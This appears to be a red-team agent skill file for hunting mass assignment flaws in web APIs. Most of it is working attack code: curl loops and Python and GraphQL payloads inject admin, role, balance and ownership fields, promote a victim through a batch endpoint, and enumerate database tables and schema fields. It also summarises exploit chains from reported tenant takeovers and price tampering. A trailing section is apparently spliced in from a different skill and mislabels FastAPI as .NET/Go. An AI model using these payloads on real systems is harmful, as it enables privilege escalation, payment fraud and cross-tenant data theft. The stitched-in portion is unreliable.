---
name: hunt-mass-assignment
description: Hunt mass assignment via sensitive field injection and ORM framework exploitation.
category: redteam
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
compatibility: Requires curl, python3
tags: [redteam, mass-assignment, API, ORM, authorization, field-injection]
related_skills:
  - hunt-api-misconfig
  - hunt-idor
  - hunt-write-gap
---

# Mass Assignment Hunting

Hunt for mass assignment vulnerabilities where API endpoints blindly bind user-supplied fields to internal objects without allowlisting. Sensitive fields like `isAdmin`, `role`, `ownerId`, `plan`, `tier`, `balance`, and `verified` can be injected to escalate privileges, bypass payments, or assume ownership of resources.

## When to Use

- API accepts JSON/XML/form body with fields beyond what the UI exposes.
- User profile updates, registration, checkout, or resource creation endpoints.
- Framework ORMs (Rails ActiveRecord, Laravel Eloquent, Django ORM, Mongoose, Prisma) where bulk assignment is the default.
- PATCH endpoints that accept sparse updates — may skip per-field authorization.

## Quick Detection

```bash
# Inject sensitive fields into profile update
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","isAdmin":true,"role":"admin"}'
```

## Key Sensitive Field Dictionary

| Field | Impact |
|---|---|
| `isAdmin`, `is_admin`, `admin` | Admin escalation |
| `role`, `roles`, `user_role` | Role escalation |
| `ownerId`, `user_id`, `authorId` | Resource takeover |
| `plan`, `tier`, `subscription_type` | Payment bypass |
| `balance`, `credits`, `wallet` | Financial manipulation |
| `verified`, `is_verified`, `email_verified` | Verification bypass |
| `discount`, `coupon_applied`, `promo` | Pricing manipulation |
| `organizationId`, `tenantId`, `teamId` | Cross-tenant access |
| `banned`, `disabled`, `suspended` | Account state control |

## Procedure

### Phase 1 — Sensitive Field Injection

```bash
# Dictionary fuzzing on profile endpoint
FIELDS=("isAdmin:true" "role:admin" "is_admin:true" "roles:[\"admin\"]"
        "plan:enterprise" "tier:platinum" "balance:999999"
        "verified:true" "ownerId:1" "user_id:1" "authorId:1"
        "organizationId:1" "teamId:1" "tenantId:1"
        "can_manage:true" "permissions:{\"admin\":true}"
        "access_level:admin" "group:administrators"
        "is_superuser:true" "superuser:1" "staff:true")

for field in "${FIELDS[@]}"; do
  key="${field%%:*}"
  val="${field#*:}"
  curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
    -H "Content-Type: application/json" \
    -d "{\"$key\":$val,\"name\":\"test\"}" \
    -w "\n%{http_code} — $key\n" -o /dev/null
done
```

### Phase 2 — Shape Variants & Encoding

```bash
# Dot-path notation (Mongoose, some ORMs)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"profile.is_admin":true}' \
  -H "Content-Type: application/json"

# Bracket notation (PHP frameworks)
curl --max-time 30 --connect-timeout 10 -sk -X POST "https://target.com/api/register" \
  -d 'user[name]=test&user[is_admin]=1' \
  -H "Content-Type: application/x-www-form-urlencoded"

# Array wrappers (Rails, Laravel)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"user":{"name":"test","admin":true}}' \
  -H "Content-Type: application/json"

# Duplicate keys (parser differential)
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -d '{"name":"test","role":"user","role":"admin"}' \
  -H "Content-Type: application/json"
```

### Phase 3 — Framework-Specific Patterns

```python
# Django REST Framework — PATCH on nested serializers
requests.patch("https://target.com/api/profile/", json={
    "user": {"is_staff": True, "is_superuser": True}
})

# Laravel Eloquent — forceFill bypass
requests.post("https://target.com/api/users", json={
    "name": "test", "email": "test@test.com",
    "is_admin": 1, "role": "admin"
})

# Mongoose — $set on findByIdAndUpdate
requests.put("https://target.com/api/users/me", json={
    "$set": {"role": "admin", "verified": True}
})

# Prisma — connect/create nested relations
requests.post("https://target.com/api/organizations", json={
    "name": "test",
    "owner": {"connect": {"id": 1}}  # takeover existing owner
})
```

### Phase 4 — Batch & Patch Format Exploitation

```bash
# JSON Patch — add operation with sensitive field
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/json-patch+json" \
  -d '[{"op":"add","path":"/role","value":"admin"}]'

# JSON Merge Patch — full object replacement
curl --max-time 30 --connect-timeout 10 -sk -X PATCH "https://target.com/api/user/profile" \
  -H "Content-Type: application/merge-patch+json" \
  -d '{"role":"admin","verified":true}'

# Batch endpoint — per-item auth skipped
curl --max-time 30 --connect-timeout 10 -sk -X PUT "https://target.com/api/users/batch" \
  -d '{"users":[{"id":"me","name":"test"},{"id":"VICTIM_ID","role":"admin"}]}'
```

### Phase 5 — GraphQL Input Type Injection

```graphql
mutation UpdateProfile {
  updateProfile(input: {
    name: "test"
    role: ADMIN       # injected field not in schema
    isAdmin: true     # injected field
  }) {
    id
    role
  }
}
```

## Pitfalls

- **Some frameworks silently ignore unknown fields.** Try the same field with different naming conventions (snake_case, camelCase, PascalCase).
- **PATCH may be more permissive than PUT.** Test both methods — some frameworks apply different serializers per HTTP method.
- **GraphQL input types are self-documenting.** Use introspection to find all writable fields, then test for extras not in the schema.
- **Batch endpoints often skip per-item authorization.** Test with mixed arrays where only one item belongs to the attacker.

## MDPsec Verified Patterns (real mass-assignment reports)

Real-world primitives from mdpsec.com reports:

1. **Writable tenant attribute on public sign-up** — cloud IdP public sign-up client's writable-attributes list includes `custom:aId` (the tenant identifier the ENTIRE backend uses for data scoping); both unauth `SignUp` and authenticated `UpdateUserAttributes` accept attacker-supplied values; backend endpoints scope by JWT claim with NO membership-row check → SignUp with victim tenant UUID → verify code → sign-in → full victim tenant directory incl. SUPER_ADMIN holder; one UpdateUserAttributes + fresh sign-in hot-swaps across every customer (127).
2. **Client-supplied price/charge_amount** — group-purchase checkout computes discounted total in browser and POSTs whole order object back; server never recomputes → `charge_amount: 100` mints payment page charging $100 for $64,500 order (46).
3. **Caller-supplied audit fields** — billing catalog write accepts caller-supplied "updated by" field verbatim → forgeable audit trail (85).
4. **Business_type internal role names** — org provisioning endpoint accepted 5 internal staff role names; invalid values echoed full enum (31).
5. **Mass-assignment probes** — `status`, `accountId`, `amount`, `perkId` fields silently ignored → entitlement bypass, not cross-account (93). Test extra fields: role, is_admin, user_role, privilege, type, access_level, tenant_id, aId.

Cross-ref `mdpsec-report-knowledge` for the full index.

## Verification

1. Inject a sensitive field into a PATCH/POST/PUT endpoint that the attacker should not control.
2. Verify the field was persisted by reading it back via GET.
3. Confirm the field change grants elevated access (e.g., access admin panel, view other users).
4. Test with multiple naming conventions to rule out framework-level field rejection.
5. Check batch and patch-format endpoints which may use different serializers.

## Related Skills

- **`hunt-api-misconfig`** — Broader API misconfiguration including mass assignment patterns.
- **`hunt-idor`** — Object-level authorization gaps often combined with mass assignment.
- **`hunt-write-gap`** — Endpoints that allow writes without requiring read authentication.


---

## Content from local version



## What Next

- If PostgREST hints reveal tables → proceed to `hunt-write-gap` (test PATCH/POST/DELETE)
- If Zod errors reveal fields → test `hunt-business-logic` (mass assignment, price tampering)
- If FastAPI reveals auth schema → test `jwt-attack` or `api-noauth-hunt`
- Schema enumeration always leads to the next attack — never the final step

## Phase 4 — Aggressive Table Fuzzing

Generate a comprehensive wordlist combining:

```bash
# 1. From JS bundle analysis
grep -oP 'from\(["\x60][a-zA-Z_]+["\x60]\)' /tmp/target.js | sort -u

# 2. From common patterns
# Singular/plural: user/users, post/posts, product/products
# Snake/camel: user_sessions, userSessions, UserSessions
# Domain-specific: appointments, patients, assessments, certificates

# 3. Systematic fuzz
for table in $(cat /tmp/wordlist.txt); do
  curl -sk -w "%{http_code}" "${BASE}/rest/v1/${table}?select=count" \
    -H "apikey: ${KEY}" 2>/dev/null | tee -a /tmp/fuzz_results.txt
done
```




## Phase 2 — Zod/FastAPI Validation Error Mining

Modern frameworks return detailed validation errors exposing all expected fields.

### FastAPI (.NET/Go)
```bash
# POST with empty body or wrong fields
curl -sk -X POST "https://api.target.com/endpoint" \
  -H "Content-Type: application/json" -d '{}' 2>/dev/null
# Response reveals ALL required fields:
# {"errors":{"usuario":["required"],"senha":["required"]}}
```

### Zod (Next.js/Node)
```bash
curl -sk -X POST "https://target.com/api/workspaces" \
  -H "Content-Type: application/json" -d '{}' 2>/dev/null
# Response: {"error":{"name":"ZodError","message":"[\n  {\"expected\":\"string\",\"path\":[\"name\"]}\n]"}}
```


